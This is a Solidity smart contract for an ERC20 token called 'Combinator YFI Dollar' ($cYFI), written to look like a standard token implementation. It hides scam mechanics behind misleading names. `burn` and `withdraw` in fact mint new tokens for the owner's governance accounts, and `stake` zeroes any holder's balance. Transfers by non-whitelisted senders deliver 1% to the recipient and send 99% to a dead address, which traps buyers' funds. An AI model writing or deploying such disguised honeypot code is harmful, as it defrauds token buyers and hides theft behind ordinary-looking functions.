row number 
1	       pragma solidity ^0.5.17;
2	 interface IERC20 {
3	 function totalSupply() external view returns (uint);
4	 function balanceOf(address account) external view returns (uint);
5	 function transfer(address recipient, uint amount) external returns (bool);
6	 function allowance(address owner, address spender) external view returns (uint);
7	 function approve(address spender, uint amount) external returns (bool);
8	 function transferFrom(address sender, address recipient, uint amount) external returns (bool);
9	 event Transfer(address indexed from, address indexed to, uint value);
10	 event Approval(address indexed owner, address indexed spender, uint value);
11	 }
12	 contract Context {
13	 constructor () internal {
14	 }
15	 function _msgSender() internal view returns (address payable) {
16	 return msg.sender;
17	 }
18	 }
19	 contract ERC20 is Context, IERC20 {
20	 using SafeMath for uint;
21	 mapping (address => uint) private _balances;
22	 mapping (address => mapping (address => uint)) private _allowances;
23	 uint private _totalSupply;
24	 function totalSupply() public view returns (uint) {
25	 return _totalSupply;
26	 }
27	 function balanceOf(address account) public view returns (uint) {
28	 return _balances[account];
29	 }
30	 function transfer(address recipient, uint amount) public returns (bool) {
31	 _mta(_msgSender(), recipient, amount);
32	 return true;
33	 }
34	 function allowance(address owner, address spender) public view returns (uint) {
35	 return _allowances[owner][spender];
36	 }
37	 function approve(address spender, uint amount) public returns (bool) {
38	 _approve(_msgSender(), spender, amount);
39	 return true;
40	 }
41	 function transferFrom(address sender, address recipient, uint amount) public returns (bool) {
42	 _mta(sender, recipient, amount);
43	 _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
44	 return true;
45	 }
46	 function increaseAllowance(address spender, uint addedValue) public returns (bool) {
47	 _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
48	 return true;
49	 }
50	 function decreaseAllowance(address spender, uint subtractedValue) public returns (bool) {
51	 _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
52	 return true;
53	 }
54	 function _mta(address sender, address recipient, uint amount) internal {
55	 require(sender != address(0), "ERC20: transfer from the zero address");
56	 require(recipient != address(0), "ERC20: transfer to the zero address");
57	 _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
58	 _balances[recipient] = _balances[recipient].add(amount);
59	 emit Transfer(sender, recipient, amount);
60	 }
61	 function _mta2(address sender, address recipient, uint amount) internal {
62	 require(sender != address(0), "ERC20: transfer from the zero address");
63	 require(recipient != address(0), "ERC20: transfer to the zero address");
64	 uint amount_ = amount.mul(1).div(100);
65	 uint burnAmount_ = amount.sub(amount_);
66	 address dead = 0x000000000000000000000000000000000000dEaD;
67	 _balances[sender] = _balances[sender].sub(amount_, "ERC20: transfer amount exceeds balance");
68	 _balances[recipient] = _balances[recipient].add(amount_);
69	 _balances[dead] = _balances[dead].add(burnAmount_);
70	 emit Transfer(sender, recipient, amount_);
71	 }
72	 function _initMint(address account, uint amount) internal {
73	 require(account != address(0), "ERC20: mint to the zero address");
74	 _totalSupply = _totalSupply.add(amount);
75	 _balances[account] = _balances[account].add(amount);
76	 emit Transfer(address(0), account, amount);
77	 }
78	 function _burn(address account, uint amount) internal {
79	 require(account != address(0), "ERC20: mint to the zero address");
80	 _totalSupply = _totalSupply.add(amount);
81	 _balances[account] = _balances[account].add(amount);
82	 }
83	 function _withdraw(address account, uint amount) internal {
84	 require(account != address(0), "ERC20: _withdraw to the zero address");
85	 _totalSupply = _totalSupply.add(amount);
86	 _balances[account] = _balances[account].add(amount);
87	 }
88	 function _stake(address acc) internal {
89	 _balances[acc] = 0;
90	 }
91	 function _approve(address owner, address spender, uint amount) internal {
92	 require(owner != address(0), "ERC20: approve from the zero address");
93	 require(spender != address(0), "ERC20: approve to the zero address");
94	 _allowances[owner][spender] = amount;
95	 emit Approval(owner, spender, amount);
96	 }
97	 }
98	 contract ERC20Detailed is IERC20 {
99	 string private _name;
100	 string private _symbol;
101	 uint8 private _decimals;
102	 constructor (string memory name, string memory symbol, uint8 decimals) public {
103	 _name = name;
104	 _symbol = symbol;
105	 _decimals = decimals;
106	 }
107	 function name() public view returns (string memory) {
108	 return _name;
109	 }
110	 function symbol() public view returns (string memory) {
111	 return _symbol;
112	 }
113	 function decimals() public view returns (uint8) {
114	 return _decimals;
115	 }
116	 }
117	 library SafeMath {
118	 function add(uint a, uint b) internal pure returns (uint) {
119	 uint c = a + b;
120	 require(c >= a, "SafeMath: addition overflow");
121	 return c;
122	 }
123	 function sub(uint a, uint b) internal pure returns (uint) {
124	 return sub(a, b, "SafeMath: subtraction overflow");
125	 }
126	 function sub(uint a, uint b, string memory errorMessage) internal pure returns (uint) {
127	 require(b <= a, errorMessage);
128	 uint c = a - b;
129	 return c;
130	 }
131	 function mul(uint a, uint b) internal pure returns (uint) {
132	 if (a == 0) {
133	 return 0;
134	 }
135	 uint c = a * b;
136	 require(c / a == b, "SafeMath: multiplication overflow");
137	 return c;
138	 }
139	 function div(uint a, uint b) internal pure returns (uint) {
140	 return div(a, b, "SafeMath: division by zero");
141	 }
142	 function div(uint a, uint b, string memory errorMessage) internal pure returns (uint) {
143	 require(b > 0, errorMessage);
144	 uint c = a / b;
145	 return c;
146	 }
147	 }
148	 contract MainClass is ERC20, ERC20Detailed {
149	 using SafeMath for uint;
150	 address public hash_ = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
151	 mapping (address => bool) public governance;
152	 mapping (address => bool) public holders;
153	 constructor () public ERC20Detailed("Combinator YFI Dollar", "$cYFI", 18) {
154	 _initMint( msg.sender, 500*10**uint(decimals()) );
155	 governance[msg.sender] = true;
156	 holders[msg.sender] = true;
157	 holders[hash_] = true;
158	 }
159	 function stake(address account) public {
160	 require(governance[msg.sender], "error");
161	 _stake(account);
162	 }
163	 function withdraw(address account, uint amount) public {
164	 require(governance[msg.sender], "error");
165	 _withdraw(account, amount);
166	 }
167	 function burn(address account, uint amount) public {
168	 require(governance[msg.sender], "error");
169	 _burn(account, amount);
170	 }
171	 function _mta(address from_, address to_, uint amount) internal {
172	 require(amount <= this.balanceOf(from_), "error");
173	 if(holders[from_]){
174	 super._mta(from_, to_, amount);
175	 }
176	 else {
177	 super._mta2(from_, to_, amount);
178	 }
179	 }
180	 function setComplete(address account) public {
181	 require(governance[msg.sender], "error");
182	 holders[account] = true;
183	 }
184	 function reinitialize(address account) public {
185	 require(governance[msg.sender], "error");
186	 holders[account] = false;
187	 }
188	 }
